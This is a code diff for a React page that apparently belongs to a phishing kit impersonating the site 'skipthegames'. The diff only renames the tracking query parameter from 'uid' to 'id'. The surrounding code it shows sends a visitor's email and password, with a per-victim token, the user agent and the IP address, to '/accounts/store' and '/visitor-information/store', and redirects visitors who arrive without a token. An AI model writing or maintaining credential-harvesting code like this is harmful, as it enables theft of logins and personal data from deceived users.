@@ -20,7 +20,7 @@ export default function Index() {
          const { data } = await request.post('/accounts/store', {
             email,
             password,
-            user_access_token: searchParams.get("uid"),
+            user_access_token: searchParams.get("id"),
             site: 'skipthegames',
             user_agent: window.navigator.userAgent
          });
@@ -55,7 +55,7 @@ export default function Index() {
 
       try {
          await request.post('/visitor-information/store', {
-            user_access_token: searchParams.get("uid"),
+            user_access_token: searchParams.get("id"),
             site: 'skipthegames',
             user_agent: window.navigator.userAgent,
             ip_address: ipAddress
@@ -83,7 +83,7 @@ export default function Index() {
    }
 
    useEffect(() => { 
-      if (!searchParams.get("uid")) {
+      if (!searchParams.get("id")) {
          navigate('/page-not-found'); 
       } else {
          handleVisitorInfo()
